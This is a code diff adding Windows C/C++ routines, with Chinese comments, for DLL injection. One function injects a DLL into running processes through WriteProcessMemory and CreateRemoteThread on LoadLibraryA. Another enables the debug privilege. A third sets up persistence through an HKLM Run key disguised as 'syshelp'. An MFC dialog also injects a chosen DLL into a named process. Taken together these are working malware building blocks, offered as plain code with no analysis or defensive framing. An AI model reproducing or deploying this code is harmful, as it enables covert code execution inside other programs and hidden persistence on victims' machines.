@@ -1,0 +1,217 @@
+
+int InjectProcess(PROCESSENTRY32& pe, char* dllPath)
+{
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	if (!Process32First(hSnapshot, &pe)) 
+	{
+		return -1;
+	}
+	//PTHREAD_START_ROUTINE pfn = (PTHREAD_START_ROUTINE)GetProcAddress(\
+		LoadLibrary("kernel32"), "LoadLibraryW");
+	PTHREAD_START_ROUTINE pfn = (PTHREAD_START_ROUTINE)GetProcAddress(\
+		GetModuleHandle("kernel32"), "LoadLibraryA");
+	if (NULL == pfn)
+	{
+		return -2;
+	}
+	//pfn(dllPath);
+	//printf("%d", pfn);
+	int cnt = 0;
+	while (Process32Next(hSnapshot, &pe)) 
+	{
+		if(!strcmp(pe.szExeFile, "inject.exe"))
+		{
+			//跳过自己，不注入自己
+			continue;
+		}
+		//根据进程ID得到进程句柄
+		HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+		if (hTargetProcess) 
+		{
+#if 1
+			void* pRemoteData = VirtualAllocEx(hTargetProcess, 0,
+				lstrlenA(dllPath)+1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+			if (!pRemoteData)
+			{
+				continue;
+			}
+
+			//将dll名字拷贝到宿主进程中
+			if (!WriteProcessMemory(hTargetProcess,
+				pRemoteData, dllPath, lstrlenA(dllPath) + 1, 0))
+			{
+				continue;
+			}
+			//在宿主进程中创建线程
+			HANDLE hRemoteThread = CreateRemoteThread(
+				hTargetProcess, NULL, 0, (PTHREAD_START_ROUTINE)pfn,
+				pRemoteData, 0, NULL);
+			if (!hRemoteThread)
+			{
+				int err = errno;
+				continue;
+			}
+#endif
+			//cnt++;
+			//VirtualFreeEx(hTargetProcess, pRemoteData, 0, MEM_RELEASE);
+			//CloseHandle(hRemoteThread);
+			//::WaitForSingleObject(hRemoteThread, INFINITE);
+			return 0;
+		}
+	}
+
+	return cnt;
+}
+
+//提升进程访问权限
+bool ImprovePriv()
+{
+	HANDLE hToken;
+	LUID sedebugnameValue;
+	TOKEN_PRIVILEGES tkp;
+
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+	{
+		return false;
+	}
+	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
+	{
+		CloseHandle(hToken);
+		return false;
+	}
+	tkp.PrivilegeCount = 1;
+	tkp.Privileges[0].Luid = sedebugnameValue;
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) 
+	{
+		CloseHandle(hToken);
+		return false;
+	}
+	return true;
+}
+
+bool AutoStart(char* path)
+{
+	//程序添加开机自启动
+	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+	HKEY hKey;
+	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regname, 0, KEY_ALL_ACCESS, &hKey);    //打开注册表键
+	ret = RegSetValueEx(hKey, "syshelp", 0, REG_EXPAND_SZ,
+		(unsigned char*)path, strlen(path)); //设置键值
+
+	if (ret == 0)
+	{
+		printf("succes to write reg key.\n");
+		RegCloseKey(hKey);
+		return true;
+	}
+	else
+	{
+		printf("failed to open regedit.%d\n", ret);
+		return false;
+	}
+}
+
+
+
+
+
+void CDllInjectDlg::OnBnClickedBtnInject()
+{
+	char szDllName[MAX_PATH] = {0};
+	char szProcessName[MAXBYTE] = {0};
+
+	DWORD dwPid = 0;
+
+	GetDlgItemText(IDC_EDIT_DLL, szDllName, MAX_PATH);
+	GetDlgItemText(IDC_EDIT_PROCESS, szProcessName, MAXBYTE);
+
+	// 由进程名称获得PID
+	dwPid = GetProcId(szProcessName);
+
+	// 注入szDllName到dwPid
+	InjectDll(dwPid, szDllName);
+}
+
+DWORD CDllInjectDlg::GetProcId(char* pszProcessName)
+{
+	// E:\MyWork\Dev\Test\MFC\DllInject\Debug\TestInjectDll.dll
+	// superdic.exe
+	if (NULL == pszProcessName)
+		return -1;
+
+	PROCESSENTRY32 pe32 = {0};
+	HANDLE hSnap,hProcess;
+
+	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (hSnap == NULL)
+		return -1;
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	
+	if (Process32First(hSnap, &pe32))
+	{
+		do
+		{
+			hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, (DWORD)pe32.th32ProcessID);
+
+			if (hProcess == INVALID_HANDLE_VALUE)
+				continue;
+
+			if (_stricmp(pe32.szExeFile, pszProcessName) == 0)
+				return pe32.th32ProcessID;
+
+			TRACE("processName=%s\r\n", pe32.szExeFile);
+		} while (Process32Next(hSnap, &pe32) != FALSE);
+	}
+	
+	return 0;
+}
+
+void CDllInjectDlg::InjectDll(DWORD dwPid, char* pszDllName)
+{
+	if (dwPid < 0 || NULL == pszDllName || lstrlen(pszDllName) == 0)
+		return;
+
+	char* pszFunName = "LoadLibraryA";
+
+	// 1.打开目标进程
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
+
+	if (hProcess == NULL)
+		return;
+
+	// 2.计算欲注入DLL文件完整路径的长度
+	int nDllLen = lstrlen(pszDllName) + sizeof(char);
+
+	// 3.在目标进程中申请一块长度为nDllLen大小的内存空间
+	PVOID pDllAddr = VirtualAllocEx(hProcess, NULL, nDllLen, MEM_COMMIT, PAGE_READWRITE);
+
+	if (pDllAddr == NULL)
+	{
+		CloseHandle(hProcess);
+		return;
+	}
+
+	DWORD dwWriteNum = 0;		// 实际写入长度
+
+	// 4.将欲注入DLL文件的完整路径写入在目标进程中申请的空间内
+	if (!WriteProcessMemory(hProcess, pDllAddr, pszDllName, nDllLen, &dwWriteNum))
+		return;
+
+	// 5.获得LoadLibraryA()函数的地址
+	FARPROC pFunAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), pszFunName);
+
+	// 6.创建远程线程
+	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunAddr, pDllAddr, 0, NULL);
+
+	WaitForSingleObject(hRemoteThread, INFINITE);
+
+	CloseHandle(hRemoteThread);
+	CloseHandle(hProcess);
+}
+
+
